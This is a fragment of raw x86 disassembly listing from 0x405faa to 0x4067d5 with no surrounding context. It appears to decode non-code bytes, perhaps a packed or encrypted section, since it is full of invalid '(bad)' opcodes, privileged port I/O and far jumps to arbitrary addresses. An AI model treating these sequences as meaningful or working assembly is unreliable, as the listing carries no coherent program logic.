  405faa:	ret    0xcd3e
  405fad:	rcl    cl,cl
  405faf:	rol    ecx,1
  405fb1:	into   
  405fb2:	push   es
  405fb3:	cmc    
  405fb4:	loope  0x405fa7
  405fb6:	js     0x405fa7
  405fb8:	inc    esp
  405fb9:	outs   dx,DWORD PTR ds:[esi]
  405fba:	outs   dx,BYTE PTR ds:[esi]
  405fbb:	(bad)  
  405fbc:	js     0x406036
  405fbe:	push   0x7c
  405fc0:	js     0x40603a
  405fc2:	lods   eax,DWORD PTR ds:[esi]
  405fc3:	sar    DWORD PTR [esi+0x6c],1
  405fc6:	call   0xb5788b19
  405fcb:	mov    al,ds:0xccd272ed
  405fd0:	push   ds
  405fd1:	test   eax,0x3bd2053e
  405fd6:	sbb    cl,BYTE PTR [eax]
  405fd8:	(bad)  
  405fd9:	push   edx
  405fda:	ret    0x6498
  405fdd:	rcr    DWORD PTR [esi-0x1d],cl
  405fe0:	pusha  
  405fe1:	loopne 0x406042
  405fe3:	into   
  405fe4:	xor    bh,BYTE PTR [ebx+0x1d]
  405fe7:	lea    ecx,[ebx+0x217dabd4]
  405fed:	adc    esp,esp
  405fef:	mov    BYTE PTR [edx],bh
  405ff1:	cmp    BYTE PTR [eax+0xd],cl
  405ff4:	add    BYTE PTR [eax-0x7c],dl
  405ff7:	fstp   TBYTE PTR [edi-0x5a]
  405ffa:	rcr    DWORD PTR [edi+0x7e],0xba
  405ffe:	dec    esp
  405fff:	xchg   BYTE PTR [eax],ch
  406001:	xor    eax,0x2b5a1bde
  406006:	jnp    0x40601c
  406008:	dec    edi
  406009:	aam    0xd4
  40600b:	add    DWORD PTR [edi+0x1a],ecx
  40600e:	dec    esp
  40600f:	jle    0x40600c
  406011:	addr16 dec esp
  406013:	jl     0x406048
  406015:	mov    bl,0x28
  406017:	and    ebx,DWORD PTR [edx+0x46]
  40601a:	ja     0x405fc6
  40601c:	fs es js 0x40602b
  406020:	fiadd  WORD PTR [esi-0x5cb68b74]
  406026:	sbb    DWORD PTR [ecx+0x6d],edx
  406029:	das    
  40602a:	lods   eax,DWORD PTR ds:[esi]
  40602b:	mov    ch,0x49
  40602d:	cmp    eax,0xe90c20db
  406032:	pop    ebp
  406033:	sbb    al,0x61
  406035:	jo     0x4060a0
  406037:	jmp    FWORD PTR [eax+0x65]
  40603a:	scas   al,BYTE PTR es:[edi]
  40603b:	xor    al,0x55
  40603d:	mov    ds:0xa1df4902,al
  406042:	add    BYTE PTR [edx-0x1dd9786e],dh
  406048:	ins    DWORD PTR es:[edi],dx
  406049:	hlt    
  40604a:	std    
  40604b:	pop    bp
  40604d:	mov    ah,0x57
  40604f:	in     eax,dx
  406050:	inc    ecx
  406051:	ror    DWORD PTR [edi-0x50530b6c],1
  406057:	pop    esp
  406058:	mov    esi,0xb85a225f
  40605d:	inc    esp
  40605e:	adc    cl,BYTE PTR [edi]
  406060:	mov    ds:0xb87601e2,eax
  406065:	add    edx,DWORD PTR ss:[esi+0x3b]
  406069:	pusha  
  40606a:	shl    DWORD PTR [ecx-0x42],cl
  40606d:	enter  0xacd2,0x2e
  406071:	sub    ebx,edx
  406073:	pop    eax
  406074:	sub    BYTE PTR [ecx],cl
  406076:	std    
  406077:	pusha  
  406078:	cmp    eax,0xe311bda4
  40607d:	or     edi,ebp
  40607f:	or     al,0x1d
  406081:	retf   
  406082:	leave  
  406083:	mov    bl,0x71
  406085:	sbb    esi,ebx
  406087:	retf   0x27b2
  40608a:	loopne 0x4060ec
  40608c:	inc    esi
  40608d:	not    BYTE PTR ds:0x8fa30775
  406093:	pop    esp
  406094:	xor    eax,0xaf9ef041
  406099:	xchg   esp,eax
  40609a:	and    al,0x25
  40609c:	push   0xffffff9b
  40609e:	clc    
  40609f:	push   esp
  4060a0:	cmp    eax,0x650894af
  4060a5:	inc    ebx
  4060a6:	sub    eax,0xc9ce075a
  4060ab:	imul   edx,DWORD PTR [edx+0x1428e023],0x2dcfbc9
  4060b5:	sub    eax,0xf9a4fb85
  4060ba:	jnp    0x40611d
  4060bc:	outs   dx,DWORD PTR ds:[esi]
  4060bd:	repnz cdq 
  4060bf:	sub    al,0x4d
  4060c1:	cwde   
  4060c2:	jecxz  0x406132
  4060c4:	outs   dx,BYTE PTR ds:[esi]
  4060c5:	mov    esi,0xb5c9d42a
  4060ca:	jb     0x406074
  4060cc:	mov    dl,0x5d
  4060ce:	sbb    eax,0xf0a9dac5
  4060d3:	add    al,ch
  4060d5:	and    eax,0xfd9ef7b8
  4060da:	and    bl,BYTE PTR ds:0x2d2a9323
  4060e0:	push   ds
  4060e1:	mov    dh,0xf7
  4060e3:	gs (bad) 
  4060e5:	std    
  4060e6:	and    DWORD PTR [edi+0x46eb54c2],0x29
  4060ed:	loope  0x4060cf
  4060ef:	mov    BYTE PTR [edx-0x5be7357e],0xdc
  4060f6:	mov    ds:0x233d31cc,al
  4060fb:	in     al,dx
  4060fc:	lds    ebx,FWORD PTR [ecx]
  4060fe:	dec    ebp
  4060ff:	pop    edx
  406100:	add    al,BYTE PTR [edi-0x663173b3]
  406106:	neg    ecx
  406108:	call   0xda42:0xcf20c5fd
  40610f:	or     ch,BYTE PTR ds:0x8e1718b8
  406115:	jge    0x40618d
  406117:	out    dx,eax
  406118:	pop    ds
  406119:	xchg   ebx,eax
  40611a:	out    dx,al
  40611b:	inc    ecx
  40611c:	cmp    esp,DWORD PTR [ecx+0x48aaf563]
  406122:	mov    edx,0xccf4cfb1
  406127:	and    al,0x58
  406129:	test   BYTE PTR [edx+0x79f7eacc],0xba
  406130:	lea    edi,[edi+0x18]
  406133:	xchg   DWORD PTR [esi-0x6d],edx
  406136:	cmc    
  406137:	push   esi
  406138:	jae    0x4060f1
  40613a:	std    
  40613b:	stc    
  40613c:	xor    eax,0x2699d20
  406141:	sub    edx,eax
  406143:	dec    esi
  406144:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406145:	adc    al,0x5
  406147:	jmp    0xcebd:0xc329f899
  40614e:	xor    dl,bl
  406150:	enter  0xee10,0x9c
  406154:	adc    ecx,edx
  406156:	lods   al,BYTE PTR ds:[esi]
  406157:	mov    ch,0xc
  406159:	ss mov bh,0x16
  40615c:	xor    al,0x38
  40615e:	pusha  
  40615f:	popf   
  406160:	retf   0x78c2
  406163:	imul   esp,DWORD PTR [ebx],0xffffffc5
  406166:	scas   al,BYTE PTR es:[edi]
  406167:	jo     0x406149
  406169:	xor    al,0xce
  40616b:	jns    0x4061bd
  40616d:	retf   
  40616e:	or     cl,BYTE PTR [ebx+0x48]
  406171:	mov    ebp,0x76b5eb9f
  406176:	mov    ebp,0xf1ad8fc
  40617b:	std    
  40617c:	dec    ecx
  40617d:	loope  0x40614c
  40617f:	mov    ecx,0x3c5c5de0
  406184:	hlt    
  406185:	imul   esi,DWORD PTR [edx-0x24],0x41c95bca
  40618c:	imul   edx,esp,0x7b5b578d
  406192:	add    DWORD PTR [eax-0x10da0186],eax
  406198:	jnp    0x4061e4
  40619a:	inc    ebx
  40619b:	and    DWORD PTR [ebx-0x5131eefd],eax
  4061a1:	or     esi,DWORD PTR [ecx-0x75397de8]
  4061a7:	sbb    eax,0x62c8e70
  4061ac:	popa   
  4061ad:	jg     0x4061af
  4061af:	scas   al,BYTE PTR es:[edi]
  4061b0:	cmp    ebp,edi
  4061b2:	ds aam 0x6e
  4061b5:	push   cs
  4061b6:	sub    cl,BYTE PTR [esi+0x37]
  4061b9:	adc    BYTE PTR [ecx],al
  4061bb:	test   eax,0x60a9b528
  4061c0:	inc    ecx
  4061c1:	cmp    BYTE PTR [edi+edi*2+0x1f6a27d9],0xb8
  4061c9:	mov    ecx,DWORD PTR [edi+esi*2+0x359e46e5]
  4061d0:	fs jbe 0x4061e6
  4061d3:	or     BYTE PTR [ecx-0xe65bed3],dh
  4061d9:	jmp    0x406206
  4061db:	adc    cl,BYTE PTR [edx]
  4061dd:	pop    ebx
  4061de:	cmp    ebx,esp
  4061e0:	sub    ebp,DWORD PTR [eax]
  4061e2:	lea    eax,[esi+0x45]
  4061e5:	loopne 0x406169
  4061e7:	(bad)  
  4061e8:	loope  0x406234
  4061ea:	pop    eax
  4061eb:	mov    eax,ds:0xe9b795ae
  4061f0:	cmp    esi,ebx
  4061f2:	jle    0x40621d
  4061f4:	jp     0x406230
  4061f6:	add    al,0xf8
  4061f8:	in     al,dx
  4061f9:	mov    esi,0x7b1e525f
  4061fe:	mov    BYTE PTR [ecx+0x5d25afef],dl
  406204:	out    dx,al
  406205:	aam    0xe0
  406207:	ins    DWORD PTR es:[edi],dx
  406208:	pop    esp
  406209:	inc    eax
  40620a:	out    dx,al
  40620b:	sub    BYTE PTR [ecx+0xf],ch
  40620e:	jne    0x406241
  406210:	imul   ecx,DWORD PTR [ebx+0x59],0x2d7720e4
  406217:	ret    
  406218:	cld    
  406219:	mov    ds:0xd28b3cdf,eax
  40621e:	mov    dl,0x16
  406220:	push   DWORD PTR [edi+0x6e]
  406223:	(bad)  
  406224:	adc    DWORD PTR [edi],eax
  406226:	and    bh,ah
  406228:	inc    eax
  406229:	inc    ebp
  40622a:	cli    
  40622b:	dec    edi
  40622c:	ret    
  40622d:	dec    ebx
  40622e:	jo     0x406220
  406230:	mov    ds:0x28ab343e,eax
  406235:	dec    edx
  406236:	rcr    ebx,1
  406238:	leave  
  406239:	mov    es,WORD PTR [esi-0x41cfc469]
  40623f:	and    esi,DWORD PTR [esi+ebx*2]
  406242:	out    0x41,al
  406244:	xchg   esp,eax
  406245:	jae    0x406263
  406247:	in     al,0xc7
  406249:	test   al,0xce
  40624b:	inc    ebp
  40624c:	mov    BYTE PTR [ebx+0x60d22ddc],cl
  406252:	jle    0x406211
  406254:	int3   
  406255:	mov    ebp,0xdd996f0c
  40625a:	call   0xa2ed:0x754181ae
  406261:	dec    esi
  406262:	and    dl,BYTE PTR [esp+eax*1+0x41249e7d]
  406269:	test   DWORD PTR [ebp-0x5deca4c4],edi
  40626f:	mov    eax,0x98cb7a4a
  406274:	inc    esi
  406275:	ja     0x4062f1
  406277:	cdq    
  406278:	inc    edi
  406279:	adc    eax,0xe0d5b772
  40627e:	cmp    eax,0xde5824c9
  406283:	push   ebx
  406284:	pop    ebp
  406285:	and    DWORD PTR [eax-0x2a55292d],edi
  40628b:	mov    ds:0x46929dd7,eax
  406290:	adc    eax,0x7ca3710a
  406295:	dec    esi
  406296:	rdtsc  
  406298:	hlt    
  406299:	into   
  40629a:	(bad)  
  40629b:	mov    cl,bh
  40629d:	(bad)  
  40629e:	sbb    dl,al
  4062a0:	push   ss
  4062a1:	mov    ebx,0xbfff0d1f
  4062a6:	jns    0x406246
  4062a8:	mov    ah,BYTE PTR [eax+eiz*8]
  4062ab:	nop
  4062ac:	repnz cli 
  4062ae:	cwde   
  4062af:	pop    esp
  4062b0:	add    al,0x2
  4062b2:	cmp    esp,eax
  4062b4:	in     al,dx
  4062b5:	cmp    dh,bh
  4062b7:	push   cs
  4062b8:	lea    ebp,[eax+0x20]
  4062bb:	pop    es
  4062bc:	out    dx,eax
  4062bd:	test   al,0xc1
  4062bf:	mov    edi,0xbabca491
  4062c4:	(bad)  
  4062c6:	and    esp,DWORD PTR ds:0x85ce3246
  4062cc:	push   esi
  4062cd:	iret   
  4062ce:	inc    edx
  4062cf:	cmp    BYTE PTR [edi-0x1d6f835e],bl
  4062d5:	jecxz  0x406296
  4062d7:	mov    esp,0x8381bda3
  4062dc:	mov    esi,0x92267d8f
  4062e1:	pop    ecx
  4062e2:	mov    ds:0x37df04f9,al
  4062e7:	jno    0x4062a7
  4062e9:	xor    ch,ah
  4062eb:	sub    ecx,DWORD PTR [ebp+0x51f471cc]
  4062f1:	and    DWORD PTR [eax-0x4e],ebp
  4062f4:	xchg   esi,eax
  4062f5:	fsubr  st,st(2)
  4062f7:	inc    eax
  4062f8:	push   ebp
  4062f9:	cmp    al,0x47
  4062fb:	out    0x47,eax
  4062fd:	push   ss
  4062fe:	adc    ch,bl
  406300:	in     al,0xab
  406302:	aas    
  406303:	out    dx,al
  406304:	mov    eax,0xe15bbf01
  406309:	jno    0x406362
  40630b:	stos   BYTE PTR es:[edi],al
  40630c:	mov    eax,ds:0x7d5f9d84
  406311:	mov    ds:0x4a0910e1,eax
  406316:	mov    dh,0x82
  406318:	cs (bad) 
  40631a:	fbld   TBYTE PTR [ebp-0x64]
  40631d:	add    al,0x39
  40631f:	push   edi
  406320:	fist   DWORD PTR [ebp+0x4d]
  406323:	push   ss
  406324:	mov    BYTE PTR [ecx-0x5a4c02d5],al
  40632a:	shr    BYTE PTR [eax+0x11],cl
  40632d:	shl    DWORD PTR [edx+0x69],0xb6
  406331:	sub    eax,0x62d004df
  406336:	loopne 0x406370
  406338:	fsin   
  40633a:	retf   0x3d37
  40633d:	adc    eax,0x362a727a
  406342:	cmp    edi,edx
  406344:	int3   
  406345:	add    bh,BYTE PTR [edx+0x7b12f582]
  40634b:	push   ebx
  40634c:	loopne 0x40633d
  40634e:	outs   dx,BYTE PTR ds:[esi]
  40634f:	jbe    0x406304
  406351:	inc    edi
  406352:	icebp  
  406353:	xchg   ebp,eax
  406354:	nop
  406355:	xchg   ebx,eax
  406356:	push   ecx
  406357:	call   0x31b2:0x694cf47
  40635e:	pop    edi
  40635f:	ret    0xc8e6
  406362:	push   ecx
  406363:	pop    edi
  406364:	adc    DWORD PTR [esi],edi
  406366:	dec    ch
  406368:	jno    0x4063a2
  40636a:	into   
  40636b:	popf   
  40636c:	std    
  40636d:	out    dx,eax
  40636e:	mov    cl,0x7b
  406370:	out    dx,eax
  406371:	or     eax,0x14b3f11c
  406376:	shl    DWORD PTR [edi-0x6107b75],0x94
  40637d:	repz add BYTE PTR [edx],bh
  406380:	mov    ?,ebp
  406382:	retf   
  406383:	jne    0x406382
  406385:	(bad)  
  406386:	out    0x67,al
  406388:	in     eax,0xa8
  40638a:	in     al,0x64
  40638c:	call   0x1dfc:0x6411ff15
  406393:	cdq    
  406394:	mov    DWORD PTR [eax],0x21b1fbf9
  40639a:	rol    edx,0xcc
  40639d:	mov    eax,ds:0xf8e1c911
  4063a2:	xlat   BYTE PTR ds:[ebx]
  4063a3:	cmc    
  4063a4:	mov    al,0x5e
  4063a6:	push   ss
  4063a7:	ins    DWORD PTR es:[edi],dx
  4063a8:	aad    0x1b
  4063aa:	ins    BYTE PTR es:[edi],dx
  4063ab:	imul   ebx,DWORD PTR [ecx-0x63],0xfc63549d
  4063b2:	aam    0x81
  4063b4:	mov    ds:0x1025a8c2,eax
  4063b9:	gs ins BYTE PTR es:[edi],dx
  4063bb:	in     al,0xce
  4063bd:	xor    eax,0xcd721e58
  4063c2:	ins    BYTE PTR es:[edi],dx
  4063c3:	xor    edi,DWORD PTR ds:0x8c4fca83
  4063c9:	mul    BYTE PTR [edx-0x6b]
  4063cc:	test   al,0x1e
  4063ce:	adc    dh,BYTE PTR [ebx+0x6b]
  4063d1:	stc    
  4063d2:	xchg   ecx,eax
  4063d3:	cmp    ebx,DWORD PTR [ebx+ecx*1-0x2da40c16]
  4063da:	lea    esp,[edi]
  4063dc:	loop   0x406421
  4063de:	mov    bl,0x6e
  4063e0:	mov    dl,0x13
  4063e2:	sbb    bl,BYTE PTR [esi-0x29]
  4063e5:	(bad)  
  4063e6:	addr16 jmp 0xb56f9578
  4063ec:	call   0x96e5bfff
  4063f1:	mov    ecx,0x624044d7
  4063f6:	and    esi,esi
  4063f8:	dec    esi
  4063f9:	or     ebp,0xcc57b9bc
  4063ff:	mov    ah,0xe9
  406401:	sti    
  406402:	aaa    
  406403:	into   
  406404:	shl    BYTE PTR [edi-0xeb97f51],0xeb
  40640b:	adc    bl,BYTE PTR [eax-0x55f6dad9]
  406411:	inc    esp
  406412:	mov    dh,0x41
  406414:	sub    al,0x6
  406416:	retf   0x172b
  406419:	(bad)  
  40641a:	aaa    
  40641b:	push   ecx
  40641c:	push   esp
  40641d:	or     eax,edx
  40641f:	cmc    
  406420:	aaa    
  406421:	stos   DWORD PTR es:[edi],eax
  406422:	xor    al,0x70
  406424:	ret    0x1969
  406427:	(bad)  
  406428:	adc    eax,0x79f5737a
  40642d:	add    eax,0x76512ea9
  406432:	add    DWORD PTR [esi-0x7f35257a],ebx
  406438:	pop    ecx
  406439:	stc    
  40643a:	nop
  40643b:	mov    bh,0x49
  40643d:	popa   
  40643e:	cmp    DWORD PTR [ecx+0x3e],ecx
  406441:	cmp    eax,0x287a9359
  406446:	xchg   edi,eax
  406447:	pop    ebp
  406448:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406449:	add    al,0xf6
  40644b:	adc    BYTE PTR [esi+0x7e4479b5],al
  406451:	jb     0x40642c
  406453:	xchg   ebx,eax
  406454:	or     DWORD PTR [eax],0xffffffb1
  406457:	into   
  406458:	hlt    
  406459:	loopne 0x40642d
  40645b:	out    dx,al
  40645c:	add    al,0xbb
  40645e:	push   ss
  40645f:	cmp    edx,eax
  406461:	imul   ecx,ebx,0xffffff90
  406464:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406465:	out    dx,al
  406466:	aas    
  406467:	call   0x8b6b:0x15df22c8
  40646e:	(bad)  
  40646f:	sbb    eax,0xaf528ea7
  406474:	lahf   
  406475:	nop
  406476:	test   al,0x35
  406478:	leave  
  406479:	and    BYTE PTR [ebp+0x4f3a06f1],dh
  40647f:	jno    0x406464
  406481:	aad    0x91
  406483:	sub    dl,al
  406485:	mov    ebp,0x7871db82
  40648a:	test   al,0x5d
  40648c:	icebp  
  40648d:	cdq    
  40648e:	ret    0x9939
  406491:	xor    edi,DWORD PTR [eax]
  406493:	iret   
  406494:	hlt    
  406495:	mov    bl,0x60
  406497:	push   cs
  406498:	fdiv   QWORD PTR [eax-0x63d03506]
  40649e:	mov    ch,0xe2
  4064a0:	and    al,0xb
  4064a2:	mov    ebp,0xe37be237
  4064a7:	xchg   ecx,eax
  4064a8:	cmp    eax,DWORD PTR [edx-0x7d]
  4064ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064ac:	jb     0x40650e
  4064ae:	push   ds
  4064af:	push   edx
  4064b0:	mov    ecx,DWORD PTR [ebp-0x8]
  4064b3:	xor    eax,esi
  4064b5:	add    eax,edi
  4064b7:	jmp    0x4069c2
  4064bc:	mov    ebp,0xd9c2d73c
  4064c2:	fcmovnbe st,st(5)
  4064c4:	hlt    
  4064c5:	inc    ebp
  4064c6:	or     ebp,0x7e
  4064c9:	pop    ebp
  4064ca:	in     eax,0x1f
  4064cc:	pop    eax
  4064cd:	retf   0x7878
  4064d0:	push   0x7c
  4064d2:	js     0x40654c
  4064d4:	enter  0xdc77,0x1c
  4064d8:	mov    edx,0x1690d384
  4064dd:	shl    eax,1
  4064df:	and    ebp,DWORD PTR [edi]
  4064e1:	arpl   WORD PTR [edi],sp
  4064e3:	xor    edx,edi
  4064e5:	push   esi
  4064e6:	mov    ebx,0xddeb965f
  4064eb:	xchg   eax,esi
  4064ed:	mov    ds:0x172dfa5d,eax
  4064f2:	js     0x40650e
  4064f4:	xor    DWORD PTR ss:[edx+0x7a],esi
  4064f8:	xchg   ecx,eax
  4064f9:	xor    eax,0x84f65016
  4064fe:	sti    
  4064ff:	inc    eax
  406500:	mov    edx,0xc81b2162
  406505:	loope  0x406512
  406507:	(bad)  
  406508:	sti    
  406509:	sub    BYTE PTR [eax-0x1409a16],dh
  40650f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406510:	cs mov ebx,0xa4bf140b
  406516:	push   esp
  406517:	out    0x7d,al
  406519:	(bad)  
  40651a:	xchg   ebx,eax
  40651b:	or     al,0xa0
  40651d:	cdq    
  40651e:	stos   DWORD PTR es:[edi],eax
  40651f:	and    edx,DWORD PTR [ecx]
  406521:	and    al,0x3c
  406523:	out    0x93,al
  406525:	idiv   DWORD PTR [edx+edx*1-0x58]
  406529:	aad    0x35
  40652b:	adc    eax,0xccfb914e
  406530:	ins    DWORD PTR es:[edi],dx
  406531:	les    bp,DWORD PTR [ebx]
  406534:	xchg   esi,eax
  406535:	mov    eax,0x4b75679d
  40653a:	dec    ecx
  40653b:	jl     0x406514
  40653d:	cmp    al,0x4a
  40653f:	popa   
  406540:	dec    BYTE PTR [edx]
  406542:	scas   eax,DWORD PTR es:[edi]
  406543:	into   
  406544:	jmp    0x2af0:0xfc29e8a3
  40654b:	imul   eax,DWORD PTR ds:0x4116a645,0xaf1e5120
  406555:	popf   
  406556:	rol    ebx,cl
  406558:	or     al,0xc3
  40655a:	sub    DWORD PTR [ebx-0x5df9e0e3],0x41
  406561:	ror    BYTE PTR [ebx+edx*1+0x2409cc8a],0xdf
  406569:	mov    ds:0xb026800d,eax
  40656e:	pop    eax
  40656f:	out    dx,eax
  406570:	loopne 0x4065e4
  406572:	pushf  
  406573:	add    DWORD PTR [esp+esi*2-0x48],esi
  406577:	and    al,0x7
  406579:	mov    ch,0x94
  40657b:	hlt    
  40657c:	mov    bh,0xcf
  40657e:	ror    edi,1
  406580:	jmp    0xdee:0xf209669c
  406587:	stos   BYTE PTR es:[edi],al
  406588:	or     dl,BYTE PTR ds:0x5729a848
  40658e:	retf   
  40658f:	stos   BYTE PTR es:[edi],al
  406590:	sbb    eax,0x7f18d8c8
  406595:	mov    edx,DWORD PTR [ebp+0x7159e1b7]
  40659b:	xor    eax,0xd8a69052
  4065a0:	jne    0x406537
  4065a2:	sbb    dl,BYTE PTR [esi+0x4fd81a36]
  4065a8:	loope  0x4065a0
  4065aa:	push   ebp
  4065ab:	ja     0x4065c4
  4065ad:	xlat   BYTE PTR ds:[ebx]
  4065ae:	cdq    
  4065af:	inc    edi
  4065b0:	jl     0x40655b
  4065b2:	shr    BYTE PTR [edi+0x31],cl
  4065b5:	ja     0x40655a
  4065b7:	imul   edx,DWORD PTR [ebx-0x4c0f4d4],0x6b
  4065be:	mov    bh,0x5c
  4065c0:	ins    BYTE PTR es:[edi],dx
  4065c1:	jmp    0xd05b832c
  4065c6:	add    al,0xbb
  4065c8:	nop
  4065c9:	pop    ebp
  4065ca:	inc    esi
  4065cb:	jecxz  0x40663e
  4065cd:	or     ah,bh
  4065cf:	add    BYTE PTR [edx-0x1f],ah
  4065d2:	call   0xb55b57c1
  4065d7:	les    ebp,FWORD PTR [edx]
  4065d9:	cwde   
  4065da:	xchg   ebp,eax
  4065db:	out    dx,al
  4065dc:	or     eax,0x18e30582
  4065e1:	in     eax,dx
  4065e2:	or     eax,0x7310f284
  4065e7:	jl     0x406618
  4065e9:	xor    BYTE PTR [ebx+0x2145b0c2],dh
  4065ef:	push   ss
  4065f0:	add    BYTE PTR [ebx+0x4b36492],ch
  4065f6:	push   esp
  4065f7:	jmp    0xfd58:0x8c02f41b
  4065fe:	stc    
  4065ff:	push   ecx
  406600:	and    DWORD PTR [edx-0x618bc751],edi
  406606:	leave  
  406607:	mov    bl,0xa4
  406609:	mov    ds:0x83bb1aef,al
  40660e:	push   ebx
  40660f:	scas   al,BYTE PTR es:[edi]
  406610:	dec    ebp
  406611:	lods   eax,DWORD PTR ds:[esi]
  406612:	inc    esi
  406613:	(bad)  
  406614:	push   ss
  406615:	xchg   edi,eax
  406616:	ins    DWORD PTR es:[edi],dx
  406617:	mov    ah,0x90
  406619:	ret    0x8532
  40661c:	pop    ebp
  40661d:	dec    ecx
  40661e:	cdq    
  40661f:	and    al,0x63
  406621:	pushf  
  406622:	pop    ss
  406623:	in     al,dx
  406624:	jmp    0x7f92b4e1
  406629:	icebp  
  40662a:	add    ebp,DWORD PTR ds:0x6c1f88bd
  406630:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406631:	mov    ebp,DWORD PTR [ecx+0x7c]
  406634:	mov    bx,0x14a2
  406638:	aam    0xbf
  40663a:	push   0xa25d7174
  40663f:	ret    
  406640:	dec    edx
  406641:	sbb    esi,esp
  406643:	push   ecx
  406644:	rol    ebp,cl
  406646:	adc    eax,0x971a99e7
  40664b:	iret   
  40664c:	loope  0x406608
  40664e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40664f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406650:	pop    esi
  406651:	sub    eax,0xc1e5fd8
  406656:	pop    ds
  406657:	retf   0x9f07
  40665a:	push   0x1dd0281e
  40665f:	cmp    ecx,ecx
  406661:	pop    ss
  406662:	adc    DWORD PTR [eax],edi
  406664:	in     eax,0xf6
  406666:	push   esi
  406667:	rcl    edi,1
  406669:	loope  0x4066d0
  40666b:	jmp    0x406683
  40666d:	mov    fs,WORD PTR [edx+0x4f9629f0]
  406673:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406674:	add    al,0xc4
  406676:	or     edi,DWORD PTR [edi]
  406678:	xchg   ecx,eax
  406679:	lods   eax,DWORD PTR ds:[esi]
  40667a:	jmp    0x4065fc
  40667c:	pop    ebp
  40667d:	imul   esp,DWORD PTR [ecx-0x5c],0xfffffffb
  406681:	add    cl,BYTE PTR [ebx-0x69]
  406684:	jae    0x4066d2
  406686:	(bad)  
  406687:	aaa    
  406688:	cs popf 
  40668a:	jns    0x4066d1
  40668c:	lea    eax,[ebp-0x15]
  40668f:	in     eax,dx
  406690:	sub    al,0xfd
  406692:	fwait
  406693:	cld    
  406694:	pop    ss
  406695:	push   edx
  406696:	mov    esi,0xbcb11b9e
  40669b:	loopne 0x40667a
  40669d:	pop    edi
  40669e:	cwde   
  40669f:	mov    bl,0x4f
  4066a1:	adc    BYTE PTR [edx+0x3b177453],ah
  4066a7:	sbb    eax,0x19e2e876
  4066ac:	pushf  
  4066ad:	mov    bp,di
  4066b0:	aas    
  4066b1:	fldenv ds:0x452fc75c
  4066b7:	dec    ebp
  4066b8:	dec    ebx
  4066b9:	sub    BYTE PTR [eax+0xf0056b4],bl
  4066bf:	push   edx
  4066c0:	pop    edi
  4066c1:	cli    
  4066c2:	and    ebp,edi
  4066c4:	pop    ebp
  4066c5:	dec    ebx
  4066c6:	inc    ecx
  4066c7:	cmp    eax,0x78814f5c
  4066cc:	pop    edx
  4066cd:	or     al,0xa1
  4066cf:	div    BYTE PTR [ecx]
  4066d1:	loop   0x4066c0
  4066d3:	jmp    0x4066ee
  4066d5:	jl     0x4066a2
  4066d7:	imul   edx,ebp,0x7e7d9404
  4066dd:	pusha  
  4066de:	sbb    edx,DWORD PTR [esi-0x2ca49bcd]
  4066e4:	out    dx,al
  4066e5:	test   DWORD PTR [esi+ebp*4+0x58],ebx
  4066e9:	cs cdq 
  4066eb:	adc    BYTE PTR [eax+esi*8-0x25],bl
  4066ef:	pushf  
  4066f0:	xchg   ebp,eax
  4066f1:	addr16 jbe 0x406761
  4066f4:	ss ss push cs
  4066f7:	int3   
  4066f8:	mov    ds:0xc3e93635,eax
  4066fd:	pop    ebx
  4066fe:	(bad)  
  4066ff:	imul   esp,DWORD PTR ds:[esi+0x7c],0xffffff89
  406704:	lock rcl ebx,0xa0
  406708:	ins    DWORD PTR es:[edi],dx
  406709:	bound  edi,QWORD PTR [edi-0x5b485bb9]
  40670f:	in     eax,0x7e
  406711:	fs mov esp,0x7a120b85
  406717:	(bad)  
  406718:	retf   0xeb24
  40671b:	jge    0x406791
  40671d:	ja     0x406782
  40671f:	inc    ebp
  406720:	mov    BYTE PTR [eax-0x30],bh
  406723:	mov    ebx,0xac8c7cd8
  406728:	(bad)  
  406729:	mov    ah,0x2f
  40672b:	(bad)  
  40672c:	fistp  WORD PTR [edi+0x5c]
  40672f:	pop    es
  406730:	(bad)  
  406732:	sbb    BYTE PTR [ebp+0x45],0xdd
  406736:	pushf  
  406737:	push   eax
  406738:	fidivr WORD PTR [bp+di]
  40673b:	ss cmp eax,0xe09244ba
  406741:	sbb    BYTE PTR [eax-0x11696382],bl
  406747:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406748:	push   cs
  406749:	xchg   edi,eax
  40674a:	xchg   edi,eax
  40674b:	jo     0x40673d
  40674d:	retf   0xfa84
  406750:	imul   ecx,DWORD PTR [eax+eiz*8-0x50],0xa
  406755:	xchg   ecx,eax
  406756:	cdq    
  406757:	ret    
  406758:	cmp    BYTE PTR ds:0xb467cbf9,ah
  40675e:	inc    esi
  40675f:	out    dx,al
  406760:	xchg   ebx,eax
  406761:	pop    esp
  406762:	sub    bh,BYTE PTR ds:0xb6fcd782
  406768:	test   DWORD PTR [esi],ebx
  40676a:	mov    bl,0xf7
  40676c:	push   cs
  40676d:	rcr    DWORD PTR [ecx+0x4891bc7a],1
  406773:	push   es
  406774:	adc    BYTE PTR [ebx+0x2f86571b],ch
  40677a:	sbb    eax,0x56385c32
  40677f:	adc    bl,cl
  406781:	pop    esi
  406782:	mov    ebp,0x31683b01
  406787:	mov    WORD PTR [ecx-0x5e062ef8],ds
  40678d:	dec    edx
  40678e:	jno    0x406766
  406790:	cmp    edi,DWORD PTR [edx+0x6b479e47]
  406796:	pop    ebp
  406797:	stc    
  406798:	cmp    cl,al
  40679a:	inc    ecx
  40679b:	mov    es,edi
  40679d:	daa    
  40679e:	push   ecx
  40679f:	shl    BYTE PTR [ebx-0x6cf7101b],1
  4067a5:	lock int 0xb4
  4067a8:	jo     0x4067d4
  4067aa:	jns    0x4067be
  4067ac:	xchg   esp,eax
  4067ad:	jle    0x406761
  4067af:	cmp    al,0xd0
  4067b1:	jmp    0xf018:0x24792279
  4067b8:	xor    eax,0x222ee307
  4067bd:	mov    dh,0xf0
  4067bf:	xchg   esp,eax
  4067c0:	nop
  4067c1:	adc    al,0xac
  4067c3:	fdiv   DWORD PTR [ecx-0x10400914]
  4067c9:	mov    eax,ds:0xde217f6e
  4067ce:	data16 and al,bh
  4067d1:	cmp    cl,al
  4067d3:	jp     0x406785
  4067d5:	push   esi
